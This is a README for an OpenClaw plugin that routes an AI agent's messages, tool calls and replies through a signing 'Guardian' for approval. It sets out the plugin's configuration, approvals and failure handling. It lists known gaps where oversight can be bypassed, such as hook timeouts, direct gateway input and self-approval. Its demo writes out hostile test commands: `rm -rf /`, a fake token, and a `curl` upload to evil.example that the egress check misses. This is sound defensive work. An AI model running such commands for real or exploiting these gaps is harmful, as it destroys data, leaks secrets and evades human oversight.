# OpenClaw adapter

The adapter is an [OpenClaw](https://github.com/openclaw/openclaw) plugin that sends signed ACS steps to a Guardian. The steps cover sessions, turns, user messages and attachments, tool calls, tool results, and replies. The adapter enforces decisions through existing OpenClaw hooks. [Gaps in `mapping.md`](mapping.md#gaps) lists paths the adapter cannot govern.

A step in a run that acts for a person carries that person in `metadata.user_context`, as named by the messaging channel. The model never supplies that identity.

The adapter works with Guardians that use the ACS-Core HMAC-SHA256 baseline of §10. The adapter uses the TypeScript reference's [host adapter](../../reference-implementations/agt/packages/host-adapter/README.md) for signing, verification, and decision checks. The adapter reaches the Guardian only over the wire.

The adapter does not meet ACS-Core in full. [Conformance](#conformance) says what the tests verify and what they do not. A § number in this file refers to a section of the [specification](../../docs/spec/instrument/specification.md).

## Get started

1. Start a Guardian that signs responses as §10 requires. Encode at least 32 secret bytes as standard base64. Note the Guardian's `key_id`.
2. Install the plugin and enable it by name:

```bash
openclaw plugins install --link /absolute/path/to/agent-control-standard/adapters/openclaw
openclaw plugins enable acs-guardian-client
```

3. Configure the adapter under `plugins.entries.acs-guardian-client` in `openclaw.json` ([`openclaw.json.example`](openclaw.json.example)). Apply the [OpenClaw settings](#openclaw-settings) the deployment needs.
4. Restart the gateway.

To try it with no Guardian of your own, no messaging account and no paid model, see [Run it with no paid model account](#run-it-with-no-paid-model-account).

## OpenClaw settings

The adapter converts the data that OpenClaw's hooks provide. The adapter does not check OpenClaw's settings. These settings decide which hooks reach the adapter. Each row says what breaks when a setting is missing.

| Setting | Without it |
|---|---|
| `plugins.entries.acs-guardian-client.enabled: true`, or the id in `plugins.allow` | OpenClaw runs tool-result middleware only for a plugin enabled by name. Without this setting, tool results reach the model with no `toolCallResult`. |
| `plugins.entries.acs-guardian-client.hooks.allowConversationAccess: true` | OpenClaw drops `before_agent_run` and `agent_end` for an installed plugin. OpenClaw logs a registry warning, but a message can reach the model with no `userMessage`. |
| `plugins.entries.acs-guardian-client.hooks.timeoutMs` and `.timeouts`, including `after_tool_call`, longer than `deadlineMs`, or unset | An operator's hook timeout takes precedence over the adapter's requested timeout (`hookTimeoutMs`). If the operator's timeout expires first, OpenClaw lets the original message, reply, or tool call through. |
| `commands.allowFrom` listing only the operators, with no wildcard | A sender can change runtime settings for their own session (`/queue`, the model, and inline directives). No hook sees those changes. If this key is unset, every paired sender can change them. |
| `agentRuntime: { id: "openclaw" }` for every model an agent runs | A run on the Codex runtime does not call `before_agent_run`. A CLI runtime's tool results also skip the middleware. |

OpenClaw unloads a plugin if registration throws. The agent then runs without governance. The adapter therefore does not throw during registration. If the adapter cannot use its configuration, it registers hooks that block every step and logs the reason. It does the same if OpenClaw lacks a capability needed to convert every step: the tool-result middleware registrar or `api.runtime.state.openKeyedStore`. A deployment must still check that `openclaw plugins` lists the adapter as loaded.

Regardless of the settings, the adapter cannot send a step when OpenClaw does not provide a fact the step needs. The Guardian never sees such a step, so the adapter blocks a tool call, a user message or a reply whatever the posture says, as it blocks a step it cannot sign. A tool result follows the failure posture (§6.4): under the ACS default, `proceed`, the model reads it; under `failurePosture: closed`, it is withheld. The audit log records each case as `failure.kind: "unsignable"`. Examples are the steps of a run that used another runtime and skipped `before_agent_run`, a delivery without a session named by OpenClaw, and an attachment the adapter cannot read. A session refused by the Guardian remains refused for these steps.

The OpenClaw settings listed above do not restrict direct input to the gateway. [Gaps in `mapping.md`](mapping.md#gaps) lists paths the adapter cannot govern. OpenClaw's `chat.send` method and voice controls put text into a running turn. No plugin hook sees that text first. Both require the gateway's `operator.write` scope. Only people trusted by the Guardian's policy should have that scope, a Control UI session, or a paired node or mobile client.

The adapter is tested on OpenClaw 2026.10.9, the release its `package.json` names.

## Configuration

| Key | Default | What it does |
|---|---|---|
| `guardianUrl` | required | Set this to the Guardian's ACS endpoint. |
| `hmacKeyId` | required | Set this to the `key_id` the Guardian uses for the secret (§10). |
| `hmacSecretFile` or `hmacSecretEnv` | one is required | Set one of these keys. Put the HMAC secret in a file or environment variable. Store it as standard base64 and use at least 32 decoded bytes. Do not put the secret in the config. |
| `failurePosture` | `negotiated` | `negotiated` applies the Guardian's `on_decision_failure`. It uses the ACS default, `proceed`, if no ServerHello arrived. `closed` blocks every step that receives no decision ([Failure posture](#failure-posture)). |
| `deadlineMs` | `5000` | This sets the longest wait for one hook. Every step the hook sends, including handshakes, shares this deadline. The adapter reserves its last 250 ms to record the Guardian's answer in OpenClaw's plugin state. Set this value above 250 and below `hookTimeoutMs`. |
| `hookTimeoutMs` | `15000` | This sets the timeout the plugin asks OpenClaw to give each hook that waits for the Guardian. |
| `pingIntervalMs` | `30000` | This sets how often the gateway sends `system/ping` (§13). A failed probe produces one warning in OpenClaw's log per outage. A probe does not decide a step. |
| `maxUndecidedMessages` | `20` | This sets the maximum number of messages the adapter keeps for a session whose run is not admitted. The adapter drops an extra message, since the Guardian never sees it. OpenClaw also passes a slash command through `reply_dispatch` before refusing it, and starts no run. A sender can therefore fill their own session's list by sending this many refused commands. The list stays full until OpenClaw ends the session. |
| `maxAttachmentBytes` | `524288` | This sets the maximum attachment bytes per inbound message. The adapter counts bytes for local files and images. URL-only attachments remain URLs and do not count toward this limit. If counted bytes exceed the limit, the adapter drops the message, so the model cannot read an attachment the Guardian did not see. The default keeps the message's base64 data under the TypeScript Guardian's 1 MiB request limit. |
| `auditLog` | `.acs/audit.jsonl` | This sets the adapter's audit log path, relative to the gateway's working directory. |

The adapter always sets `agent_id` to `openclaw`. To let the Guardian distinguish agents, give each agent its own secret and `key_id` ([#306](https://github.com/GenAI-Security-Project/agent-control-standard/issues/306)).

## How each decision lands

[`mapping.md`](mapping.md) lists every OpenClaw hook and ACS step. It says what each hook sends and how the adapter enforces each decision. It explains why the adapter does not use other hooks or steps. The short form is:

- **A message.** `reply_dispatch` reads each message as the person sent it. The hook provides the quote, text, and attachments. The adapter sends local attachment bytes. It sends a URL when OpenClaw holds only a URL. OpenClaw may add other data to the model request ([gap](mapping.md#gaps)). A message that joins a running turn is sent as that turn's `userMessage`. The adapter drops the message for any answer other than `allow`. The adapter holds other messages for the session's next run because OpenClaw selects the session after this hook. The adapter sends nothing in place of a dropped message.
- **A run.** `before_agent_run` sends `sessionStart` once per session, then `turnStart`, then one `userMessage` per held message. Each message keeps its original text and attachments. Some runs do not start with a person's message. These include scheduled runs, heartbeats, system events, hooks, relays, and sub-agent tasks. These runs send `agentTrigger` with the run's text. ACS-Core requires `userMessage` or `agentTrigger`. The first refusal blocks the run. The adapter admits runs in each session in sequence, so it sends `sessionStart` once.
- **A tool call.** `allow` runs it with the parameters the Guardian saw. `modify` runs it with the Guardian's parameters. `ask` becomes an OpenClaw approval ([Approvals](#approvals)). `defer` and `deny` block it.
- **A tool result.** The model reads the result only after `toolCallResult` receives an answer. `allow` gives the model the original result. A supported `modify` gives the model the rewritten result. Any other answer withholds the result.
- **A reply.** `reply_payload_sending` sends `agentResponse` with the whole reply, including text, media, and structured parts. `modify` replaces the text and media. The adapter cancels a reply if it also carries fallback text, spoken text, or a structured part. The adapter cannot apply changes to those parts as decided. `message_sending` sends each delivery as `agentResponse` again, including tool sends. The adapter uses the session OpenClaw names for the delivery. The adapter blocks a delivery with no named session. The adapter sends nothing in place of a blocked reply.
- **The end of a turn or a session.** `turnEnd` and `sessionEnd` are recorded only. They are not decision-eligible, so no answer blocks anything.

A decision this host cannot carry out as sent is blocked and written to the audit log as `substituted`. This includes `modify` on a user message. It also includes `modify` on a reply with media at `message_sending`, or with a structured part at `reply_payload_sending`. The adapter also blocks `modify` on a result that is not text or images (`modify_unsupported`, §6.5). It blocks `ask` on any step except a tool call. It blocks every `defer`.

The plugin registers every hook at the lowest priority. OpenClaw therefore keeps this plugin's tool-call `params` and returned reply text. A plugin cannot detect two cases that break this rule. First, OpenClaw keeps the first approval request any plugin returns, with that plugin's `params`. Second, OpenClaw runs each plugin's tool-result middleware in turn. Do not run another plugin that returns `params` or `requireApproval` from `before_tool_call`, or registers tool-result middleware.

## What it reads

- **The sender.** `user_id` is the channel's id for the person who wrote the message. `authentication_method` is the channel's name (`signal`, `a2a`). The schema leaves `authentication_method` open. This adapter uses it for the channel. A tool call and reply act for the person who started their run. `before_agent_run` names that person, and the adapter stores the name with the run.
- **Group chats.** An OpenClaw session can include several people, such as in a group or channel. Each step carries the person whose message or run caused it. Two people in one group therefore have two `user_context` values in one ACS session. A reply goes to the conversation OpenClaw delivers it to, such as the group. `agentResponse` has no recipient field.
- **A run with no channel sender.** A scheduled run (`trigger: cron`) in an admitted session acts for the person admitted to that session. In a group, that person is the first person whose run was admitted. That person may not have scheduled the run. This is the adapter's interpretation because OpenClaw names no person for a scheduled run. Other runs without a channel sender include heartbeats, system events, hooks, relays from another session, and sub-agent runs. The adapter sends those runs to the Guardian without `user_context`, which ACS makes optional.
- **The session.** The ACS `session_id` is the UUIDv5 of OpenClaw's session id. A reused session key therefore starts a new ACS session. A reset can keep OpenClaw's session id (`session_end` names the same id as `nextSessionId`). In that case, the ACS session continues. The adapter sends no `sessionEnd` or second `sessionStart`. The plugin keeps each session's admitted sender in OpenClaw's plugin state across restarts.
- **A delivery.** OpenClaw names the session for `message_sending`. OpenClaw 2026.10.9 names the destination's session when a tool sends to another conversation (`deliver-prepare.ts`). The adapter sends the delivery as `agentResponse` for that session. The Guardian decides the delivery, and the adapter enforces the answer. If no run was admitted in the destination session, the adapter blocks the delivery. The Telegram channel names no session for some deliveries, including fallback, structured, and command replies. The adapter blocks those deliveries too. Fixing both cases requires OpenClaw to pass the sending run's session to the hook.
- **The turn.** `metadata.turn_id` is OpenClaw's run id. The adapter includes it on every step from `turnStart` through `turnEnd`. A step has no turn id if it names no run while two runs in its session are live. `metadata.agent_name` names the OpenClaw agent that runs the session.
- **A tool call.** OpenClaw provides the tool name and arguments. The adapter does not know tools by name. A Guardian rule that needs a tool field reads it from `arguments`.

## Approvals

An `ask` becomes an OpenClaw plugin approval when `ask_details.approver.type` is `human`. The adapter uses the same format for every tool. `title` contains the tool's name. `description` contains `ask_details.question`, followed by `ask_details.context` when the Guardian sent it.

`timeoutMs` is `timeout_seconds` × 1000. The available decisions are `allow-once` and `deny`. The adapter adds no text and sets no `scope`. The OpenClaw channel displays the approval.

The Guardian's question names what the person must see. The adapter blocks a question over OpenClaw's 512-character limit or a tool name over its 80-character limit. The adapter never cuts either value. OpenClaw approvals are answered by people, so the adapter blocks an `ask` for an `agent` or `service` approver.

OpenClaw routes each prompt through its `approvals.plugin` settings. OpenClaw decides who may resolve the prompt for each channel. If a channel has no reviewer list, OpenClaw uses that channel's `allowFrom` list.

In a direct-message deployment, the `allowFrom` list contains the senders. The person whose action needs approval could therefore approve the action. Give each channel an explicit reviewer list that names only approvers. For example, use `approvals.plugin.slack.approvers` ([OpenClaw's plugin approvals](https://docs.openclaw.ai/plugins/plugin-permission-requests)).

You can also resolve approvals only through a gateway client: `openclaw approvals pending` and `openclaw approvals resolve <id> allow-once`.

ACS v0.1 has no wire method to return the answer to the Guardian ([#175](https://github.com/GenAI-Security-Project/agent-control-standard/issues/175)). The plugin applies the answer itself. It writes an `approval` line to its audit log with the approver named by the Guardian, OpenClaw's resolution, and the step's outcome. OpenClaw does not report who resolved the prompt. This approval therefore does not prove that the named approver authorized the step ([#136](https://github.com/GenAI-Security-Project/agent-control-standard/issues/136)).

OpenClaw limits a plugin approval to 600 seconds and blocks a call if approval times out. It offers only three decisions. The adapter cannot honor `timeout_disposition: allow`. OpenClaw does not show `ask_details.options`.

OpenClaw owns an approval after `before_tool_call` returns it. A later session refusal cannot cancel that pending approval. An `allow-once` answer can therefore run the call after refusal. OpenClaw does not await `onResolution`, and callback failure cannot block execution.

## Checks at load time

A deployment that cannot be governed stops instead of running ungoverned:

- OpenClaw validates the config against `openclaw.plugin.json` before the plugin loads, so a missing or unknown key stops the gateway.
- A config can pass the schema and still be unusable. For example, the secret file may be unreadable or the secret may be under 32 bytes. In that case, the adapter registers hooks that block every step and logs why.
- An OpenClaw without the tool-result middleware registrar or `api.runtime.state.openKeyedStore` does the same.

## Failure posture

An answer the adapter cannot rely on blocks the step, regardless of `on_decision_failure`:

- `host-adapter` records `failure.kind: "signature_invalid"` if an answer's signature fails under the session's key and `key_id`. It records the same failure if the answer belongs to another request. This includes a different JSON-RPC `id` or a different `request_id` in the decision. A session whose ServerHello failed verification has this failure for every step ([#308](https://github.com/GenAI-Security-Project/agent-control-standard/issues/308)).
- `host-adapter` records `failure.kind: "decision_invalid"` if a decision breaks the specification's `response-envelope.json` ([#182](https://github.com/GenAI-Security-Project/agent-control-standard/issues/182)). For example, a `deny` without `reasoning` is invalid.

Other cases that block:

- A Guardian can refuse the handshake, for example, when the HMAC key does not match. That refusal is a decision, so §4.1 requires the host to block the session. A Guardian can also refuse a session by answering `sessionStart` with anything but `allow`: a `modify` cannot change a session that has started, so it blocks as §6.5 asks. The adapter checks for refusal after Guardian responses and state operations, before returning permission to OpenClaw. The adapter keeps the refusal in OpenClaw's plugin state until OpenClaw ends the session. Every plugin registration then blocks the session, including registrations after a restart. An approval already returned to OpenClaw has a separate limit ([Approvals](#approvals)).
- A verified JSON-RPC error in place of a decision blocks the step, except `-32603`, which follows the posture. An unsigned error never lets a step proceed ([#308](https://github.com/GenAI-Security-Project/agent-control-standard/issues/308)).
- The Guardian can report that it no longer knows the session (`-32003`). If the new handshake fails, the adapter blocks the step. The session keeps its negotiated posture.
- The adapter blocks a step if waiting for OpenClaw's plugin state or reading message attachments exceeds the hook's deadline. OpenClaw lets a tool call run, or a message or reply through, when a hook times out.

`host-adapter` handles a signed ServerHello that this host rejects. A signed ServerHello may not accept `acs-core` or HMAC-SHA256. In that case, the adapter keeps the Guardian's `on_decision_failure`, and the next step negotiates again. A ServerHello that breaks `handshake.json` is malformed. A ServerHello that negotiates another version or transport is also malformed. The ACS default applies to either malformed response (§6.4).

When no usable decision arrives, `failurePosture` decides:

| | The Guardian is down when the session starts (§4.1) | The Guardian fails during a negotiated session |
|---|---|---|
| `negotiated` | The ACS default, `proceed`, with a `proceeded` audit line and no line in OpenClaw's log | The session's `on_decision_failure` |
| `closed` | Blocked | Blocked |

The steps from one hook share one `deadlineMs`. A step can therefore stop waiting before the Guardian's negotiated timeout ends. The adapter blocks that step and audits it with `posture_source: "host"`, whatever the posture. Section 6.4 applies the posture only when no decision arrived within the negotiated timeout. A slow Guardian must not cause the adapter to let a step proceed ([#269](https://github.com/GenAI-Security-Project/agent-control-standard/issues/269)). Set `deadlineMs` to cover every step from one hook at the Guardian's usual latency.

A first handshake has a different rule. If the hook deadline ends or the handshake fails, the session has no ServerHello. Section 4.1 applies the startup posture, which `failurePosture` sets. `negotiated` uses the ACS default, `proceed`.

OpenClaw sends the original message or reply if `reply_dispatch`, `reply_payload_sending`, or `message_sending` times out. The adapter must therefore answer before those hooks time out. Under `closed`, the adapter audits a blocked step with `posture_source: "host"`. The adapter audits a step that proceeds as §6.4 requires. If the adapter cannot write that audit line, it blocks the step ([Discussion #325](https://github.com/GenAI-Security-Project/agent-control-standard/discussions/325)). The adapter catches internal errors in these hooks. `reply_dispatch` claims and drops the message. `reply_payload_sending` cancels the reply. `message_sending` cancels the delivery. If a hook throws or times out before returning, OpenClaw lets the original through.

## Conformance

The tests prove emission conformance and the scenarios listed below. They do not prove conformance with every ACS-Core requirement. No conformance claim ([template](../../docs/spec/conformance-claim-template.md)) is filed for this adapter. The ClientHello declares `profiles_supported: ["acs-core"]`. A Guardian negotiates the §10 signature only for that profile.

- **Proved:**
  - Every tested envelope and step payload validates against `specification/v0.1.0/` and its hook schema.
  - The adapter verifies every answer (§10, #308) and checks every decision against the response schema (#182).
  - A refused handshake blocks the session (§4.1).
  - The adapter applies `modify` as §6.3 requires. It blocks and records a `modify` that it cannot apply (§6.3, §6.5).
  - The adapter never answers a step that is not decision-eligible with a block ([#146](https://github.com/GenAI-Security-Project/agent-control-standard/issues/146)).
  - The adapter does not send a step outside `methods_evaluated` ([#31](https://github.com/GenAI-Security-Project/agent-control-standard/issues/31)).
  - `toolCallResult` names the request whose decision was applied in `request_id_ref` ([#305](https://github.com/GenAI-Security-Project/agent-control-standard/issues/305)).
- **Not met, with the reason:**

| ACS-Core requirement | What the adapter does | Why |
|---|---|---|
| `defer` suspends the step pending resolution (§6.4) | The adapter blocks the step and records `defer_unsupported`. | ACS v0.1 gives the host no way to receive a resolution. A `DEFER` therefore ends at its `timeout_decision`. The default is `deny`, which blocking applies at once. If `timeout_decision` is `ask`, the host has no approver to receive the step. |
| `ask` pauses the step for approval (§6.4) | The adapter sends a tool call for approval. It blocks `ask` on other steps and records `ask_unsupported`. | OpenClaw offers a plugin approval only for a tool call. |
| `subagentStart` for a sub-agent the framework spawns (ACS-Core hook taxonomy) | The adapter sends no `subagentStart` or `subagentStop`. The spawning call is decided as `toolCallRequest` in the parent's session. The sub-agent's runs are treated as runs that no person started in the sub-agent's own session. | OpenClaw names neither the parent's step that spawned the sub-agent (`parent_step_id`) nor how the sub-agent's rights relate to the parent's (`intent_derivation`). ACS-Core requires both values. |
| A peer agent's message over A2A is `agentTrigger` with `trigger_type: a2a_inbound` (`agent-trigger.json`) | The adapter sends the message as the peer's `userMessage`, with `authentication_method: "a2a"`. | OpenClaw's inbound hook does not identify a sender as an agent. The adapter does not identify channels by name. A policy can identify a peer by `authentication_method`. |
| The Guardian decides an attachment's content (`user-message.json`) | The adapter sends the bytes when OpenClaw holds the attachment at a path. It sends the URL when OpenClaw holds only a URL. | OpenClaw fetches URL content for the model after every hook. The Guardian decides the URL, but the content at that URL may change. |
| Every input reaches the Guardian as `userMessage` before the model reads it | The adapter sends every dispatched message, including its attachments. Input through the gateway's `chat.send` or voice controls reaches a run with no step. | Those inputs enter the runtime without a dispatch hook ([Gaps](mapping.md#gaps)). |
| `timeout_disposition: allow` (§9) | Blocks the call when its approval times out | OpenClaw blocks a call whose approval times out |
| Approver identity verified by the Guardian (§9) | The plugin applies and records the person's answer. | No wire method returns the answer to the Guardian. OpenClaw does not report who answered. OpenClaw's reviewer list for each channel determines who may answer ([Approvals](#approvals)). |
| Wait for a decision up to the negotiated timeout (§6.4) | The adapter waits no longer than the hook's `deadlineMs`, which all steps in the hook share. It blocks a step if that deadline cuts its wait short. | OpenClaw sets each hook's timeout when the plugin registers (`hookTimeoutMs`). A handshake has not yet negotiated that timeout. OpenClaw sends the original reply when its timeout expires. Set `deadlineMs` to cover the Guardian's negotiated timeout for every step in a hook ([Failure posture](#failure-posture)). |
| `protocols/MCP/*` when sessions involve MCP | The adapter does not send MCP protocol steps. OpenClaw gives the model MCP tool calls, resource reads, and prompt fetches as tools. The Guardian decides each as `toolCallRequest` and `toolCallResult`. | The MCP handshake and notifications reach no step. A deployment that must meet ACS-Core must configure no MCP server. OpenClaw has no plugin hook for MCP protocol messages. |

The project's Inspector shows only the entries the host adapter defines. It skips the adapter's `substituted` and `approval` lines and its `posture_source: "host"` lines; read them in the audit log itself.

## Run it with no paid model account

A local stub model and OpenClaw's bundled A2A channel run the full loop offline. The loop uses the real gateway, its tool loop, this plugin, and the TypeScript Guardian with its stock policy. The stub replaces only the model's judgment. When a message contains `run: <command>`, the stub calls OpenClaw's `exec` tool with that command. The stub then returns the tool's output. This demo needs Bun 1.4 or later, Docker, and `openssl`. OpenClaw does not load on Bun 1.3. The gateway container uses the host network. This setup works on Linux and on Docker Desktop when host networking is enabled in its settings.

```bash
# from the repository root
(cd reference-implementations/agt && bun install)
cd adapters/openclaw && bun install
export ACS_HMAC_SECRET="$(openssl rand -base64 32)" ACS_HMAC_KEY_ID=demo A2A_DEMO_TOKEN="$(openssl rand -hex 24)"

bun demo/guardian.ts &          # the TypeScript Guardian on :8787, its stock policy registered for `exec`
bun demo/stub-model.ts &        # the stub model on :8899
docker run --rm -d --name openclaw-demo --network host \
  -v "$PWD/../..:/acs:ro" -v "$PWD/demo/openclaw.json:/demo/openclaw.json:ro" \
  -e OPENCLAW_CONFIG_PATH=/demo/openclaw.json -e ACS_HMAC_SECRET -e A2A_DEMO_TOKEN \
  --entrypoint openclaw ghcr.io/openclaw/openclaw:2026.10.9 gateway run
```

The gateway uses OpenClaw's official image. It mounts this tree read-only, so a command allowed by the Guardian runs inside the container. The demo config disables gateway authentication (`auth.mode: none`) and binds the gateway to loopback. Do not use this config on a gateway that other people can reach. Wait until `docker logs openclaw-demo` shows `[gateway] ready`. Then send tasks as the A2A peer `demo`:

```bash
ask() { curl -s http://127.0.0.1:18789/a2a/v1 -H "Authorization: Bearer $A2A_DEMO_TOKEN" -H 'Content-Type: application/json' \
  -d "{\"jsonrpc\":\"2.0\",\"id\":\"1\",\"method\":\"SendMessage\",\"params\":{\"message\":{\"messageId\":\"$RANDOM\",\"role\":\"ROLE_USER\",\"parts\":[{\"text\":\"run: $1\"}]}}}"; echo; }
ask 'ls -la'                                  # allowed: the reply lists the directory
ask 'echo rm -rf /'                           # blocked by the destructive-command rule before it runs
ask "printf 'TOKEN=ghp_ABCDEF123456'"         # the reply reads TOKEN=[REDACTED]
```

The stock policy's egress gate checks `raw_command` for URLs in shell commands. The adapter leaves `raw_command` empty because it does not identify tools by name. Therefore, `ask 'curl -s https://evil.example/upload'` runs in this demo. The gate blocks a call if its `url` argument names a host outside the allowlist.

To try `ASK`, restart the Guardian with `bun demo/guardian.ts --ask`. This mode requires approval for every tool call. Send `ask pwd` to make a call. The call waits for a person to approve it. Run `docker exec openclaw-demo openclaw approvals pending` to view the prompt. Run `docker exec openclaw-demo openclaw approvals resolve <id> allow-once` to approve the call. The same policy also asks for approval of the result. Nobody can approve that result at this point, so the model receives it as withheld. Run `docker exec openclaw-demo cat /tmp/acs-demo/audit.jsonl` to view the adapter's audit lines.

## Files

| File | What it holds |
|---|---|
| `acs-plugin.ts` | Plugin entry point; configuration, required capabilities, and OpenClaw plugin state. |
| `openclaw-hooks.ts` | OpenClaw hooks and blocking hooks for an unusable adapter. |
| `runs.ts` | Inbound messages, run admission, and turn and session endings. |
| `inbound-message.ts` | Inbound messages and attachments as `userMessage` content. |
| `tool-calls.ts` | Tool calls, approvals, and tool results. |
| `replies.ts` | Replies and other deliveries. |
| `hook-state.ts` | State shared by hooks: admitted sessions and runs, and decided calls. |
| `decisions.ts` | Decisions as hook answers. |
| `acs-exchange.ts` | Signed exchanges for each step; handshakes, deadlines, verification, and failure posture. |
| `audit.ts` | Audit log. |
| `config.ts`, `openclaw.plugin.json` | Configuration and its schema. |
| `openclaw-types.ts` | OpenClaw hook types from OpenClaw's SDK. |
| `host-adapter.ts` | Import of the TypeScript reference's host adapter. |
| `demo/` | Demo Guardian launcher, stub model, and OpenClaw config. |
| `mapping.md` | OpenClaw hooks and ACS steps, including unused hooks and steps. |

## Tests

```bash
cd adapters/openclaw
bun install
bun run typecheck
bun test
```

- `tests/openclaw-hooks.test.ts` drives every hook against `tests/fake-guardian.ts`. The scripted Guardian verifies and signs with the TypeScript Guardian's own functions. It also validates every envelope against `specification/v0.1.0/`.
- `tests/guardian.e2e.test.ts` drives the hooks against the TypeScript Guardian over HTTP. It checks run admission, an allowed call, secret redaction, and blocking of a destructive command and a fetch outside the egress allowlist. It also checks approved and denied `ASK` outcomes, an answer changed in transit, and Guardian failure under `closed`.
- `tests/openclaw-live.e2e.test.ts` runs the [demo](#run-it-with-no-paid-model-account) in a stock gateway. The gateway uses the OpenClaw release installed by this package and the default `failurePosture`. The test checks every outcome, including Guardian failure from the start of a session. It needs Docker and explains why it skips when Docker is unavailable.
- The Guardian e2e and OpenClaw live e2e suites also run each scenario against the Go Guardian (`tests/guardians.ts`) with the same policy. They use the binary built by `make build` at `<agt-go>/.acs/bin/<target>/agt/acs-guardian`, if `ACS_GUARDIAN_BIN` names it. Otherwise, they use the binary in this tree's `reference-implementations/agt-go/`. If neither binary exists, both suites explain why they skip the Go Guardian. CI has no Go Guardian until #169 is merged, so CI runs these scenarios only against the TypeScript Guardian. The Go Guardian evaluates the run's own steps, so its runs check session, turn, user-message, and reply steps against a real Guardian. The TypeScript Guardian evaluates only tool steps, so CI checks those steps against `tests/fake-guardian.ts`. The suites skip `ASK` scenarios against the Go Guardian because its binary has no approver configured and answers `ASK` with `deny`.
- `tests/mapping.test.ts` checks that `mapping.md` names every hook in the installed OpenClaw release and every ACS step.

CI runs all of them on the OpenClaw release `package.json` names (`.github/workflows/openclaw-adapter.yml`).
